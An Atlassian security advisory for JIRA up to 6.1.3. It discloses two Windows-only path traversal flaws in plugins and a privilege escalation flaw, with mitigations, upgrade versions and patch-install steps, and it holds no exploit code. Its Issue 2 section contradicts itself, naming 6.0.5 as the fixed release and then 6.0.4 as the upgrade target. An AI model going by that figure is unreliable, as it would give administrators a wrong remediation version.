* [Jira Service Management Server and Data Center Advisory (CVE-2023-22501)](/jira/jira-service-management-server-and-data-center-advisory-cve-2023-22501-1188786458.html)

#### On this page

#### Related content

* No related content found

#### Still need help?

The Atlassian Community is here for you.

[Ask the community](https://community.atlassian.com/t5/custom/page/page-id/create-post-step-1?add-tags=Atlassian+Support)

This advisory details critical security vulnerabilities that we have found in JIRA and fixed in recent versions of JIRA.

* **Customers****who have downloaded and installed JIRA**should upgrade their existing JIRA installations **or** apply the patches to fix these vulnerabilities.
* **Atlassian OnDemand customers** have been upgraded with the fixes for the issues described in this advisory.

These vulnerabilities affect all versions of JIRA up to and including 6.1.3.

Atlassian is committed to improving product security. We [fully support the reporting of vulnerabilities](https://www.atlassian.com/security/How-to-report-security-issue) and we appreciate it when people work with us to identify and solve the problem.

If you have questions or concerns regarding this advisory, please raise a support request at [http://support.atlassian.com](http://support.atlassian.com/).

## **Issue 1:** Path traversal in JIRA Issue Collector plugin (Windows only)

### Severity

Atlassian rates the severity level of this vulnerability as **critical**, according to the scale published in [Severity Levels for Security Issues](https://www.atlassian.com/security/security-severity-levels). The scale allows us to rank the severity as critical, high, moderate or low.

This is an independent assessment and you should evaluate its applicability to your own IT environment.

### Description

We have identified and fixed a vulnerability in JIRA which allowed unauthenticated users to create files in any valid directory inside a JIRA install. In order to exploit this vulnerability, an attacker requires access to your JIRA web interface.

This issue only affects JIRA servers running on Windows OS. It is not exploitable on Linux and OSX systems.

The vulnerability affects all supported versions of JIRA up to and including 6.0.3. It has been fixed in 6.0.4. The issue is tracked in
[JRA-36442](https://jira.atlassian.com/browse/JRA-36442)
-
Getting issue details...
STATUS
.

Our thanks to Philippe Arteau of Groupe Technologies Desjardins who reported this vulnerability.

### Risk Mitigation

If you are unable to upgrade or patch your JIRA server, you can [disable the JIRA Issue collector plugin](/jira/managing-add-ons-185729595.html#ManagingAdd-ons-disable) via the JIRA administration interface.

In case you require the plugin, do the following as a **temporary workaround**:

* Block access to your JIRA server web interface from untrusted networks, such as the Internet.

### Fix

This vulnerability can be fixed by upgrading JIRA. Alternatively, you can upgrade only the vulnerable plugin.

The [Security Patch Policy](https://www.atlassian.com/security/security-patch-policy) describes when and how we release security patches and security upgrades for our products.

#### Upgrading JIRA

Upgrade to JIRA 6.0.4 or a later version, which fixes this vulnerability. For a full description of these releases, see the [JIRA Release Notes](/jira/jira-releases-133316.html). You can download these versions of JIRA from the [download centre](https://www.atlassian.com/software/jira/download).

If you cannot upgrade JIRA at the moment, you can upgrade only the Issue Collector plugin. See [Managing JIRA's Plugins](/jira/managing-add-ons-185729595.html) for instructions on how to upgrade a plugin. In general, you should upgrade this plugins to the latest available version compatible with your version of JIRA.

## **Issue 2:** Path traversal in JIRA Importers plugin (Windows only)

### Severity

Atlassian rates the severity level of this vulnerability as **critical**, according to the scale published in [Severity Levels for Security Issues](https://www.atlassian.com/security/security-severity-levels). The scale allows us to rank the severity as critical, high, moderate or low.

This is an independent assessment and you should evaluate its applicability to your own IT environment.

### Description

We have identified and fixed a vulnerability in JIRA which allowed unauthenticated users to create files in any valid directory inside a JIRA install. In order to exploit this vulnerability, an attacker requires access to your JIRA web interface.

This issue only affects JIRA servers running on Windows OS. It is not exploitable on Linux and OSX systems.

The vulnerability affects all supported versions of JIRA up to and including 6.0.4. It has been fixed in 6.0.5. The issue is tracked in
[JRA-36441](https://jira.atlassian.com/browse/JRA-36441)
-
Getting issue details...
STATUS
.

### Risk Mitigation

If you are unable to upgrade or patch your JIRA server you can [disable the JIRA Importers plugin](/jira/managing-add-ons-185729595.html#ManagingAdd-ons-disable) via the JIRA administration interface.

In case you require the plugin, do the following as a **temporary workaround**:

* Block access to your JIRA server web interface from untrusted networks, such as the Internet.

### Fix

This vulnerability can be fixed by upgrading JIRA. Alternatively, you can upgrade only the vulnerable plugin.

The [Security Patch Policy](https://www.atlassian.com/security/security-patch-policy) describes when and how we release security patches and security upgrades for our products.

#### Upgrading JIRA

Upgrade to JIRA 6.0.4 or a later version, which fixes this vulnerability. For a full description of these releases, see the [JIRA Release Notes](/bamboo/bamboo-release-notes-671089224.html). You can download these versions of JIRA from the [download centre](https://www.atlassian.com/software/jira/download).

If you cannot upgrade JIRA at the moment, you can upgrade only the JIRA Importers plugin. See [Managing JIRA's Plugins](/jira/managing-add-ons-185729595.html) for instructions on how to upgrade a plugin. In general, you should upgrade this plugins to the latest available version compatible with your version of JIRA.

## **Issue 3:** Privilege escalation

### Severity

Atlassian rates the severity level of this vulnerability as **critical**, according to the scale published in [Severity Levels for Security Issues](https://www.atlassian.com/security/security-severity-levels). The scale allows us to rank the severity as critical, high, moderate or low.

This is an independent assessment and you should evaluate its applicability to your own IT environment.

### Description

We have identified and fixed a vulnerability in JIRA which allowed unauthenticated attackers to commit actions on behalf of any other authorised user. In order to exploit this vulnerability, an attacker requires access to your JIRA web interface.

The vulnerability affects all supported versions of JIRA up to and including 6.1.3. It has been fixed in 6.1.4. The issue is tracked in
[JRA-35797](https://jira.atlassian.com/browse/JRA-35797)
-
Getting issue details...
STATUS
.

### Risk Mitigation

If you are unable to upgrade or patch your JIRA server you can do the following as a **temporary workaround**:

* Block access to your JIRA server web interface from untrusted networks, such as the Internet.
* Turn on [Secure Administrator Sessions](/jira/configuring-secure-administrator-sessions-231343939.html), this prevents privilege escalation to administrative accounts. Non-privileged accounts will still be vulnerable.

### Fix

This vulnerability can be fixed by upgrading JIRA. There is also a patch available for this vulnerability for the following supported versions of JIRA. If you have any questions, please raise a support request at [http://support.atlassian.com](http://support.atlassian.com/). We recommend upgrading.

The [Security Patch Policy](https://www.atlassian.com/security/security-patch-policy) describes when and how we release security patches and security upgrades for our products.

#### Upgrading JIRA

Upgrade to JIRA 6.1.4 or a later version, which fixes this vulnerability. For a full description of these releases, see the [JIRA Release Notes](/jira/jira-releases-133316.html). You can download these versions of JIRA from the [download centre](https://www.atlassian.com/software/jira/download).

#### **Patches**

We recommend patching **only** when you cannot upgrade or cannot apply external security controls. Patches are usually only provided for vulnerabilities of critical severity (as per our [Security Patch Policy](https://www.atlassian.com/security/security-patch-policy) ) as an interim solution until you can upgrade. You should not continually patch your system instead of upgrading. Our patches are often non-cumulative – we do not recommend that you apply multiple patches from different advisories on top of each other, and we strongly recommend upgrading to the most recent version regularly.

If for some reason you cannot upgrade to the latest version of JIRA, you must upgrade to the last minor version of the release. For example, if you have JIRA 5.1.1, you will have to upgrade 5.1.8 and then apply the patch provided below to fix the vulnerability described in this advisory.

Download the patch package:

Patches are provided for the last minor version of each major release. If you don't have the exact JIRA version installed, you will need to upgrade to the last minor version of the release in order to apply the patch (this means if you have JIRA 5.1.1, you will have to upgrade to 5.1.8 in order to be able to apply the patch).

| Version | Patch Package | md5 |
| --- | --- | --- |
| JIRA 4.4.5 | [patch-JRA-35797-4.4.5-20140303.zip](http://downloads.atlassian.com/software/jira/downloads/patch/patch-JRA-35797-4.4.5-20140303.zip) | 47990989c958b4b7c51785075b84e12f |
| JIRA 5.0.7 | [patch-JRA-35797-5.0.7-20140303.zip](http://downloads.atlassian.com/software/jira/downloads/patch/patch-JRA-35797-5.0.7-20140303.zip) | 1f940b97ba8bc127f306eecdad44bc55 |
| JIRA 5.1.8 | [patch-JRA-35797-5.1.8.zip](http://downloads.atlassian.com/software/jira/downloads/patch/patch-JRA-35797-5.1.8.zip) | d7db72b3656dc952604a7f7a6fea380b |
| JIRA 5.2.11 | [patch-JRA-35797-5.2.11-20140303.zip](http://downloads.atlassian.com/software/jira/downloads/patch/patch-JRA-35797-5.2.11-20140303.zip) | 3a7fe0b8a35b295ffdf93102955f7d86 |
| JIRA 6.0.8 | [patch-JRA-35797-6.0.8.zip](http://downloads.atlassian.com/software/jira/downloads/patch/patch-JRA-35797-6.0.8.zip) | 1550f9e7784aad41f69c07efe634966f |
| JIRA 6.1.x | There's no patch, upgrade directly to 6.1.4 or above | n/a |

WINDOWS USERS : Do not use the built in Windows ZIP extractor to apply this patch!

By default it replaces all the files in a directory instead of merging the files in. If this happens, JIRA will not be able to work correctly. Use another zip tool such as WinZip or 7-Zip. Alternatively, extract the files into a different directory and copy them to `<jira_install>/atlassian-jira/WEB-INF/lib` manually.

Instructions for specific versions of JIRA are available in a file `JRA-35797-x.x.x-patch-instructions.txt` located inside the corresponding ZIP file.

For reference,**instructions for JIRA 6.0.8** are below (please be sure to follow the instructions in the patch zip you have downloaded as each version has slightly different instructions):

Before applying the patch file, make a copy of your JIRA web application directory in case things go wrong. This will allow you to more easily back out any changes.

If you are using the Standalone distribution of JIRA:

1. Download the file patch-JRA-35797/patches/JRA-35797-6.0.8-patch.zip
2. In the <jira\_install>/atlassian-jira/WEB-INF/lib directory delete the following files:
   * atlassian-gadgets-api-3.2.0-m26.jar
   * atlassian-gadgets-spi-3.2.0-m26.jar
   * atlassian-trusted-apps-core-2.5.2.jar
   * atlassian-trusted-apps-seraph-integration-2.5.2.jar
   * sal-api-2.10.2.jar
   * sal-spi-2.10.2.jar
3. Expand the zip file into <jira\_install\_dir>/atlassian-jira/ overwriting the files there
4. Restart JIRA

If you are using the WAR distribution of JIRA:

1. Download the file patch-JRA-35797/patches/JRA-35797-6.0.8-patch.zip
2. In the <jira\_install\_jir>/webapp/WEB-INF/lib directory delete the following files:
   * atlassian-gadgets-api-3.2.0-m26.jar
   * atlassian-gadgets-spi-3.2.0-m26.jar
   * atlassian-trusted-apps-core-2.5.2.jar
   * atlassian-trusted-apps-seraph-integration-2.5.2.jar
   * sal-api-2.10.2.jar
   * sal-spi-2.10.2.jar
3. Expand the zip file to <jira\_install\_dir>/webapp overwriting the files there
4. Run 'build.sh clean' on unix or 'build.bat clean' on windows
5. Run 'build.sh' on unix or 'build.bat' on windows
6. Redeploy the JIRA web app into your application server

Last modified on Aug 11, 2014

Was this helpful?

Yes
No
 It wasn't accurate

 It wasn't clear

 It wasn't relevant

Provide feedback about this article

#### Related content

* No related content found

Powered by [Confluence](http://www.atlassian.com/) and [Scroll Viewport](https://www.k15t.com/go/scroll-viewport).

[Atlassian](https://www.atlassian.com/)

* [Notice at Collection](https://www.atlassian.com/legal/privacy-policy#additional-disclosures-for-ca-residents)
* [Privacy Policy](https://www.atlassian.com/legal/privacy-policy)
* [Terms of Use](https://www.atlassian.com/legal/customer-agreement)
* [Security](https://www.atlassian.com/trust/security)
* ©  Atlassian


